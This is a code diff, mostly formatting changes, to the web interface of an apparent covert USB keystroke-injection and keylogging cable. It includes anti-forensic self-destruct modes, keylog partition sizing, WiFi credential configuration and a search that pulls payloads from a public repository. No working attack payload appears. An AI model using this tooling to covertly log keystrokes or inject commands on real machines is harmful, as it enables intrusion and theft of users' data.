 			"name": "SELF-DESTRUCT 1",
-			"desc": "Completely erase all data and disconnect data lines to make cable behave 'broken'. You will need to reflash the firmware to recover. You will need to reflash the firmware to recover.\n\nWARNING: ALL SAVED CONFIGURATIONS AND PAYLOADS WILL BE ERASED!",
+			"desc": "Completely erase all data and disconnect data lines to make cable behave 'broken'. You will need to reflash the firmware to recover. You will need to reflash the firmware to recover.\n\nWARNING: ALL SAVED CONFIGURATIONS AND PAYLOADS WILL BE ERASED!", 
 			"warn": "ALL SAVED CONFIGURATIONS AND PAYLOADS WILL BE ERASED!",
-			"code": [{
-				"example": "SELF-DESTRUCT 1"
-			}]
+			"code": [{ "example": "SELF-DESTRUCT 1" }]
 		}, {
 			"feat": "selfDestruct",
 			"name": "SELF-DESTRUCT 2",
 			"desc": "Erase all data, but leave data lines connected so it behaves like a normal cable. You will need to reflash the firmware to recover.\n\nWARNING: ALL SAVED CONFIGURATIONS AND PAYLOADS WILL BE ERASED!",
 			"warn": "ALL SAVED CONFIGURATIONS AND PAYLOADS WILL BE ERASED!",
-			"code": [{
-				"example": "SELF-DESTRUCT 2"
-			}]
+			"code": [{ "example": "SELF-DESTRUCT 2" }]
 		}, {
 			"feat": "globalKeys",
 			"name": "ALT",
 			"desc": "Use the ALT key.\nAliases: OPT, OPTION",
-			"code": [{
-				'example': 'ALT'
-			}]
+			"code": [{ 'example': 'ALT' }]
 		}, {
 			"feat": "globalKeys",
 			"name": "CTRL",
 			"desc": "Use the CTRL key.\nAliases: CONTROL",
-			"code": [{
-				'example': 'CTRL'
-			}]
+			"code": [{ 'example': 'CTRL' }]
 		}, {
 			"feat": "globalKeys",
 			"name": "SHIFT",
 			"desc": "Use the SHIFT key.",
-			"code": [{
-				'example': 'SHIFT'
-			}]
+			"code": [{ 'example': 'SHIFT' }]
 		}, {
 			"feat": "globalKeys",
 			"name": "GUI",
 			"desc": "Use the GUI key.\nAliases: WIN, WINDOWS, CMD, COMMAND, META",
-			"code": [{
-				'example': 'GUI'
-			}]
+			"code": [{ 'example': 'GUI' }]
 		}];
-
+		
 		function clearHelpElements() {
 			helpElementIds.forEach(id => {
 				document.getElementById(id).innerHTML = "";
 			});
 		}
-
+		
 		function addGlobalKeysToHelpMenuItems(keymapGlobalArray) {
 			keymapGlobalArray.forEach((valueArray, key) => {
 				valueArray.forEach(value => {
@@ -5992,94 +5686,85 @@ DELAY 2000
 							"feat": "globalKeys",
 							"name": value,
 							"desc": `Use the ${value} key`,
-							"code": [{
-								example: value
-							}],
+							"code": [{ example: value }],
 						});
 					}
 				});
 			});
 		}
-
+		
 		function createHelpElements(example) {
-			const {
-				feat,
-				name,
-				desc,
-				code
-			} = example;
+			const { feat, name, desc, code } = example;
 			const parentElement = document.getElementById(`help${feat}`);
-
+		
 			const helpEntryElement = document.createElement("div");
 			helpEntryElement.classList.add("helpEntry");
-
+		
 			const nameElement = document.createElement("h3");
 			nameElement.textContent = name;
 			nameElement.classList.add(feat);
 			helpEntryElement.appendChild(nameElement);
-
+		
 			const descElement = document.createElement("pre");
 			descElement.textContent = desc;
 			descElement.classList.add(feat);
 			helpEntryElement.appendChild(descElement);
-
-			code.forEach(({
-				example
-			}) => {
+		
+			code.forEach(({ example }) => {
 				const codeElement = document.createElement("code");
 				codeElement.textContent = example;
 				codeElement.classList.add(feat);
 				helpEntryElement.appendChild(codeElement);
 			});
-
+		
 			parentElement.appendChild(helpEntryElement);
 		}
-
+		
 		function generateHelpMenu() {
 			logMessage("DEBUG", "generateHelpMenu");
 			clearHelpElements();
 			addGlobalKeysToHelpMenuItems(sortedKeymapGlobalArray());
 			helpMenuItems.forEach(createHelpElements);
 		}
-
+		
 		const handleHelpToPayload = event => {
 			logMessage("DEBUG", `handleHelpToPayload: [event]:[${event}]`);
 			const codeExample = event.target.closest("code").textContent;
 			const payloadScriptArea = document.getElementById("payload");
-
+		
 			payloadScriptArea.value += codeExample;
 			payloadScriptArea.value += "\n";
 			updateLineNumbers();
-
+		
 			logMessage("INFO", `codeExampleToPayload: [example]:[${codeExample}] [new]:[${codeExample}]`);
 		};
-
+		
 		async function searchGithubPayloads() {
 			let input = document.getElementById('searchGithubPayloads').value;
 			if (event.key === "Enter" || event.type === "click") {
 				document.getElementById('githubPayloadExamples').innerHTML = "";
-
+		
 				let url = "https://api.github.com/repos/hak5/omg-payloads/git/trees/master?recursive=1";
-
+		
 				try {
 					let response = await fetch(url);
 					let data = await response.json();
-
+		
 					let files = data.tree.filter(file => file.path.toLowerCase().includes(input.toLowerCase()) && file.path.endsWith('.txt'));
-
+		
 					for (let file of files) {
 						let fileUrl = `https://raw.githubusercontent.com/hak5/omg-payloads/master/${file.path}`;
 						let fileResponse = await fetch(fileUrl);
 						let fileData = await fileResponse.text();
-
+		
 						let h3 = document.createElement('h3');
 						let span = document.createElement('span');
 						let code = document.createElement('code');
-
+		
 						h3.textContent = file.path.split('/')[file.path.split('/').length - 2];
 						span.textContent = fileUrl;
 						code.textContent = fileData;
-
+		
 						let div = document.getElementById('githubPayloadExamples');
 						div.appendChild(h3);
 						div.appendChild(span);
@@ -6093,7 +5778,7 @@ DELAY 2000
 				}
 			}
 		}
-
+		
 		// Partition Editor Module
 		function partitionEditorCurrent() {
 			let cfbootscriptSize = document.getElementById("bootscript") ? document.getElementById("bootscript").value : '1';
@@ -6102,9 +5787,9 @@ DELAY 2000
 			let cfplcacheSize = document.getElementById("plcache") ? document.getElementById("plcache").value : '80';
 			let payloadList = document.getElementById("payload-list");
 			let cfpayloadSlots = payloadList ? payloadList.querySelectorAll("option").length : 0;
-
+		
 			let cfpayloadSlotType = document.getElementById("payloadSlotType") ? document.getElementById("payloadSlotType").value : '1';
-
+		
 			document.getElementById("bootscriptSlotSize").value = cfbootscriptSize;
 			document.getElementById("hidxfileSize").value = cfhidxfileSize;
 			document.getElementById("plcacheSlotSize").value = cfplcacheSize;
@@ -6112,7 +5797,7 @@ DELAY 2000
 			document.getElementById("payloadSlotSize").value = cfpayload1Size;
 			document.getElementById("payloadSlotType").value = slotmode;
 		}
-
+		
 		function generatePartitionEditor() {
 			logMessage(`DEBUG`, `generatePartitionEditor`);
 			let availableSpace = document.getElementById("partitionEditorAvailable").value;
@@ -6123,18 +5808,18 @@ DELAY 2000
 			let slotCount = document.getElementById("payloadSlotCount").value;
 			let payloadSlotType = document.getElementById("payloadSlotType").value;
 			let existingUsed = parseInt(bootslotSize) + parseInt(hidxfileSize) + parseInt(plcacheSize);
-
+		
 			document.getElementById("payloadSlotCount").innerHTML = "";
 			let payloadList = document.getElementById("payload-list");
 			listValues = generatePartitionSlotList(availableSpace, slotSize, payloadSlotType, existingUsed);
 			if (slotCount == "") {
 				slotCount = payloadList ? payloadList.querySelectorAll("option").length : 7;
-			} else if (slotCount > 200) {
+			} else if(slotCount > 200) {
 				slotCount = 200;
 			} else if (slotCount > listValues.length) {
 				slotCount = listValues.length - 1;
 			}
-
+			
 			listValues.forEach((values) => {
 				const name = document.createElement("option");
 				name.value = values;
@@ -6144,7 +5829,7 @@ DELAY 2000
 				}
 				document.getElementById("payloadSlotCount").appendChild(name);
 			});
-
+		
 			if (payloadSlotType === "3") {
 				keylogSizeRemaining = (availableSpace - (slotSize * slotCount * 2) - (bootslotSize) - (hidxfileSize)) * 2048;
 			} else {
@@ -6153,7 +5838,7 @@ DELAY 2000
 			output = document.getElementById('keylogSize');
 			output.innerHTML = `${keylogSizeRemaining}`;
 		}
-
+		
 		function generatePartitionSlotList(sectors, slotSize, slotType, existing) {
 			if (slotType === "3") {
 				slotSize *= 2;
@@ -6166,7 +5851,7 @@ DELAY 2000
 			}
 			return listValues;
 		}
-
+		
 		function partitionEditorApply() {
 			let bootslotSize = document.getElementById("bootscriptSlotSize").value;
 			let hidxfileSize = document.getElementById("hidxfileSize").value;
@@ -6175,14 +5860,14 @@ DELAY 2000
 			let slotCount = document.getElementById("payloadSlotCount").value;
 			let payloadSlotType = document.getElementById("payloadSlotType").value;
 			let partitionEditorAvailable = document.getElementById("partitionEditorAvailable").value;
-
+		
 			let keylogSize = partitionEditorAvailable - (slotSize * slotCount) - 1;
 			let CWInfo = document.getElementById("response-CWInfo").value;
 			wifiInfo = CWInfo.split("\t");
 			let wifiMODE = wifiInfo[1];
 			let wifiSSID = wifiInfo[2];
 			let wifiPASS = wifiInfo[3];
-
+		
 			let toRunMiddle = `INIT;F:keylog=0;F:payload1=0;F:payload2=0;F:payload3=0;F:payload4=0;F:payload5=0;F:payload6=0;F:payload7=0;F:bootscript=${bootslotSize};F:hidxfile=${hidxfileSize};F:plcache=${plcacheSize};`;
 			let toRunPostfix = `F:keylog=100%F;S:wifimode=${wifiMODE};S:wifissid=${wifiSSID};S:wifikey=${wifiPASS};`;
 			let toRunContent = "";
@@ -6199,12 +5884,12 @@ DELAY 2000
 				toRunContent += `S:slotmode=2;`;
 			}
 			let toRunInit = toRunMiddle + toRunContent + toRunPostfix;
-
+		
 			if (new TextEncoder().encode(toRunInit).length > 4096) {
 				console.error("The message size exceeds the 4096 bytes limit.");
 				return;
 			}
-
+		
 			sendMessage(`FE127`);
 			let toRunPrefixes = ["FW520192\t", "FW521216\t", "FW522240\t", "FW523264\t"];
 			for (let i = 0; i < Math.ceil(toRunInit.length / 1024); i++) {
@@ -6213,12 +5898,12 @@ DELAY 2000
 				let cmd = toRunPrefixes[i] + 1024 + "\t" + toRunInit.slice(start, end);
 				sendMessage(`${cmd}`);
 			}
-
+		
 			sendMessage(`CR1`);
 			viewDialog(`partitionEditor`, `close`);
 			viewDialog(`partitionApplied`, `open`);
 		}
-
+		
 		// Keymap Module
 		const keymapGlobal = [
 			[0x00, "NOKEY"],
@@ -6610,9 +6295,9 @@ DELAY 2000
 			"WOLOF": ['qbcdefghijkl,noparstuvzxyw&é"\'(-ñ_ŋà)=^ó*mùã;:!<', 'QBCDEFGHIJKL?NOPARSTUVZXYW1234567890É+¨ÓÑMÀÃ./Ŋ>', '    €                      ~#{[|`\\^@]} ¤       ²'],
 			"YO": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]\\;\'`,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>? ', '                              €   ‘’    ¦¶¨     '],
 		};
-
+		
 		const positionalIds = ["04", "05", "06", "07", "08", "09", "0a", "0b", "0c", "0d", "0e", "0f", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "1a", "1b", "1c", "1d", "1e", "1f", "20", "21", "22", "23", "24", "25", "26", "27", "2d", "2e", "2f", "30", "31", "33", "34", "35", "36", "37", "38", "64"];
-
+		
 		function generateKeymapViewerMenu() {
 			rows = [
 				['29', '3a', '3b', '3c', '3d', '3e', '3f', '40', '41', '42', '43', '44', '45'],
@@ -6632,9 +6317,8 @@ DELAY 2000
 				})
 			});
 		}
-
+		
 		const buildModifierTextCache = {};
-
 		function buildModifierText(modifier) {
 			console.log(`BuildModifierText: [${modifier}]`);
 			const numericModifier = parseInt(modifier, 16);
@@ -6652,26 +6336,25 @@ DELAY 2000
 			buildModifierTextCache[numericModifier] = modifierText;
 			return modifierText;
 		}
-
+		
 		const getKeyFromHIDCache = {};
-
 		function getKeyFromHID(hid, layer) {
 			const cacheKey = `${hid}_${layer}`;
 			if (getKeyFromHIDCache[cacheKey]) {
 				return getKeyFromHIDCache[cacheKey];
 			}
-
+		
 			if (typeof keymapData[hid] === 'undefined') {
 				return "NOKEY";
 			}
-
+		
 			const keyVal = layer > 0 ? keymapData[hid][layer] : keymapData[hid][0];
 			const finalKey = keyVal === "SPACE" ? " " : keyVal;
-
+			
 			getKeyFromHIDCache[cacheKey] = finalKey;
 			return finalKey;
 		}
-
+		
 		function sortedKeymapGlobalArray() {
 			const keymapGlobalMap = new Map();
 			keymapGlobal.forEach(([key, value]) => {
@@ -6684,12 +6367,12 @@ DELAY 2000
 			});
 			return new Map([...keymapGlobalMap.entries()].sort());
 		}
-
+		
 		function generateKeymapList() {
 			const keymapListElement = document.getElementById("keymap-list");
 			keymapListElement.innerHTML = "";
 			keymapList = [];
-
+		
 			for (let variableName in locale) {
 				keymapList.push(variableName);
 				const name = document.createElement("option");
@@ -6697,10 +6380,10 @@ DELAY 2000
 				name.text = variableName;
 				keymapListElement.appendChild(name);
 			}
-
+		
 			keymapListPretty = keymapList.toString().split(',').join(', ');
 		}
-
+		
 		function updateKeymapViewer(keymap, keymapViewer) {
 			keymapViewer.forEach((key, i) => {
 				const output = document.getElementById(`keymap_${key}`);
@@ -6712,7 +6395,7 @@ DELAY 2000
 			let keymapFindListDiv = document.getElementById('keymapFindList');
 			keymapFindListDiv.innerHTML = "";
 		}
-
+		
 		function generateKeymap(localeName) {
 			if (previousLocale !== localeName) {
 				previousLocale = localeName;
@@ -6728,14 +6411,14 @@ DELAY 2000
 				logMessage("CRIT", `Locale Unchanged from ${localeName}`);
 			}
 		}
-
+		
 		function generateFullKeymapGlobal() {
 			return keymapGlobal.reduce((acc, [key, value]) => {
 				acc[key.toString(16)] = [value];
 				return acc;
 			}, {});
 		}
-
+		
 		function getLocale(localeName) {
 			if (localeName) {
 				logMessage("CRIT", `Locale Set to ${localeName}`);
@@ -6745,7 +6428,7 @@ DELAY 2000
 				return "US";
 			}
 		}
-
+		
 		function processKeymapLocal(keymapLocal) {
 			keymapData = locale[keymapLocal];
 			if (!Array.isArray(keymapData)) {
@@ -6757,7 +6440,7 @@ DELAY 2000
 			}
 			return keymapData;
 		}
-
+		
 		function unpackKeymap(keymapLocal) {
 			const unpacked = {};
 			positionalIds.forEach((currentUsage, i) => {
@@ -6765,7 +6448,7 @@ DELAY 2000
 			});
 			return unpacked;
 		}
-
+		
 		const memoizedKeyToHidMapping = (() => {
 			let cache = {};
 			const memoizedFunction = (key) => {
@@ -6780,14 +6463,14 @@ DELAY 2000
 				cache[key] = result;
 				return result;
 			};
-
+		
 			memoizedFunction.invalidateCache = () => {
 				cache = {};
 			};
-
+		
 			return memoizedFunction;
 		})();
-
+		
 		function keyToHidMapping(key) {
 			if (key === " " || key === " ") {
 				key = "SPACE";
@@ -6818,12 +6501,12 @@ DELAY 2000
 				logMessage("INFO", `? PAYLOAD HALTED, ERRORS DETECTED`);
 			}
 		}
-
+		
 		const hidToKey = (keycode) => (keycode in keymapData ? keymap[keycode] : keycode);
-
+		
 		const memoizedHidToKeyMapping = (() => {
 			let cache = {};
-
+		
 			const memoizedFunction = (key) => {
 				if (cache[key]) {
 					return cache[key];
@@ -6836,30 +6519,30 @@ DELAY 2000
 				cache[key] = result;
 				return result;
 			};
-
+		
 			memoizedFunction.invalidateCache = () => {
 				cache = {};
 			};
-
+		
 			return memoizedFunction;
 		})();
-
+		
 		function hidToKeyMapping(key) {
 			const mappedKey = keymapData[key];
 			const logType = mappedKey ? "DEBUG" : "INFO";
 			const message = mappedKey ?
 				`HidToKeyMapping: (${typeof key}:${key}:${mappedKey})` :
 				`No hidToKeyMapping for (${typeof key}:${key}), check DUCKY_LANG mapping`;
-
+		
 			logMessage(logType, message);
-
+		
 			if (!mappedKey) {
 				logMessage("INFO", "? PAYLOAD HALTED, ERRORS DETECTED");
 			}
-
+		
 			return mappedKey;
 		}
-
+		
 		function generateInvertedKeymap(keymap) {
 			return Object.entries(keymap).reduce((inverted, [id, values]) => {
 				values.forEach((value, i) => {
@@ -6869,17 +6552,17 @@ DELAY 2000
 				return inverted;
 			}, {});
 		}
-
+		
 		function findMatchingLocale(positionId, layer, character) {
 			let positionIdIndex = positionalIds.indexOf(positionId);
-
+		
 			if (positionIdIndex === -1) {
 				return new Set();
 			}
-
+		
 			layer = parseInt(layer);
 			let matchingLocales = new Set();
-
+		
 			for (let localeName in locale) {
 				let keymap = locale[localeName];
 				if (layer === 0) {
@@ -6895,34 +6578,34 @@ DELAY 2000
 					}
 				}
 			}
-
+		
 			return matchingLocales;
 		}
-
+		
 		function findSharedLocales(...args) {
 			if (args.length % 3 !== 0) {
 				return [];
 			}
-
+		
 			let comparisons = [];
 			for (let i = 0; i < args.length; i += 3) {
 				comparisons.push([args[i], args[i + 1], args[i + 2]]);
 			}
-
+		
 			let sharedLocales = findMatchingLocale(...comparisons[0]);
 			comparisons.slice(1).forEach(comp => {
 				let matchingLocales = findMatchingLocale(...comp);
 				sharedLocales = new Set([...sharedLocales].filter(x => matchingLocales.has(x)));
 			});
-
+		
 			let localesString = Array.from(sharedLocales).join(', ');
-
+		
 			let keymapFindListDiv = document.getElementById('keymapFindList');
 			keymapFindListDiv.innerHTML = localesString;
-
+		
 			return Array.from(sharedLocales);
 		}
-
+		
 		function findKeymap() {
 			let keys = document.querySelectorAll('.key > div:not([id]):not([class])');
 			keys.forEach(function(key) {
@@ -6931,33 +6614,33 @@ DELAY 2000
 					key.innerHTML = '';
 				}
 			});
-
+		
 			let keyElements = document.querySelectorAll('.key');
 			let pressedKeys = [];
 			let activeElement = null;
-
+		
 			keyElements.forEach(function(keyElement) {
 				let id = keyElement.id.split('_')[1];
 				if (!positionalIds.includes(id)) {
 					return;
 				}
-
+		
 				keyElement.addEventListener('click', function() {
 					if (activeElement) {
 						activeElement.style.backgroundColor = '';
 						window.removeEventListener('keypress', activeElement.keypressHandler);
 					}
-
+		
 					this.style.backgroundColor = 'red';
 					activeElement = this;
-
+		
 					this.keypressHandler = function(e) {
 						if (e.key === 'Backspace' || e.key === 'Delete') {
 							pressedKeys = pressedKeys.filter((key) => key[0] !== id);
 							activeElement.querySelector('div:not([id]):not([class])').textContent = '';
 						} else {
 							let keyValue = e.key;
-
+		
 							activeElement.querySelector('div:not([id]):not([class])').textContent = keyValue;
 							activeElement.style.backgroundColor = '';
 							pressedKeys = pressedKeys.filter((key) => key[0] !== id);
@@ -6965,30 +6648,30 @@ DELAY 2000
 							findSharedLocales(...pressedKeys.flat());
 						}
 					};
-
+		
 					window.addEventListener('keypress', activeElement.keypressHandler);
 				});
 			});
 		}
-
+		
 		const searchInput = document.getElementById('search');
-
+		
 		const entries = Array.from(document.querySelectorAll('#helppayloadExample, #helppayload, #helpkeylog, #helpselfDestruct, #helppayloadGeofencing, #helppayloadUSBIDs, #helpglobalKeys'));
-
+		
 		document.getElementById('search').addEventListener('keyup', function() {
 			var input, filter, div, i, txtValue;
 			input = document.getElementById('search');
 			filter = input.value.toUpperCase();
 			div = document.querySelectorAll('.helpEntry');
-
+		
 			var divsToToggle = document.querySelectorAll('#helppayloadExample, #helppayload, #helpkeylog, #helpselfDestruct, #helppayloadGeofencing, #helppayloadUSBIDs, #helpglobalKeys');
-
+		
 			if (input.value === '') {
 				divsToToggle.forEach((div) => div.classList.add('hidden'));
 			} else {
 				divsToToggle.forEach((div) => div.classList.remove('hidden'));
 			}
-
+		
 			for (i = 0; i < div.length; i++) {
 				txtValue = div[i].textContent || div[i].innerText;
 				if (txtValue.toUpperCase().indexOf(filter) > -1) {
@@ -6998,15 +6681,15 @@ DELAY 2000
 				}
 			}
 		});
-
+		
 		var tooltipTimeout;
-
+		
 		function checkInput(input, field) {
 			var pattern = new RegExp(input.pattern);
 			var tooltipText = document.getElementById(field);
-
+		
 			clearTimeout(tooltipTimeout);
-
+		
 			if (!pattern.test(input.value)) {
 				input.classList.add('glowing-effect');
 				tooltipText.textContent = input.title;
@@ -7020,14 +6703,14 @@ DELAY 2000
 				tooltipText.style.visibility = 'hidden';
 			}
 		}
-
+		
 		function checkInputList(input, field, dataListId) {
 			var dataList = document.getElementById(dataListId);
 			var tooltipText = document.getElementById(field);
-
+		
 			clearTimeout(tooltipTimeout);
 			var options = Array.from(dataList.options).map(opt => opt.value);
-
+		
 			if (!options.includes(input.value)) {
 				input.classList.add('glowing-effect');
 				tooltipText.textContent = input.title;
@@ -7041,20 +6724,20 @@ DELAY 2000
 				tooltipText.style.visibility = 'hidden';
 			}
 		}
-
+		
 		function applyEffect(element) {
 			element.classList.add('apply-effect');
 			setTimeout(function() {
 				element.classList.remove('apply-effect');
 			}, 1000);
 		}
-
+		
 		const editor = document.getElementById('payload');
 		const lineNumbers = document.getElementById('lineNumbers');
-
+		
 		editor.addEventListener('input', updateLineNumbers);
 		editor.addEventListener('scroll', syncScroll);
-
+		
 		function updateLineNumbers() {
 			const lines = editor.value.split('\n');
 			lineNumbers.innerHTML = '';
@@ -7064,11 +6747,11 @@ DELAY 2000
 				lineNumbers.appendChild(lineNumber);
 			});
 		}
-
+		
 		function syncScroll() {
 			lineNumbers.scrollTop = editor.scrollTop;
 		}
-
+		
 		function setEditorLineColors(lineNumber, color) {
 			const lines = lineNumbers.childNodes;
 			if (lineNumber > 0 && lineNumber <= lines.length) {
@@ -7082,9 +6765,8 @@ DELAY 2000
 				}
 			}
 		}
-
+		
 		updateLineNumbers();
-
 
 		if (hostname == "localhost") {
 			hostname = "192.168.5.140"
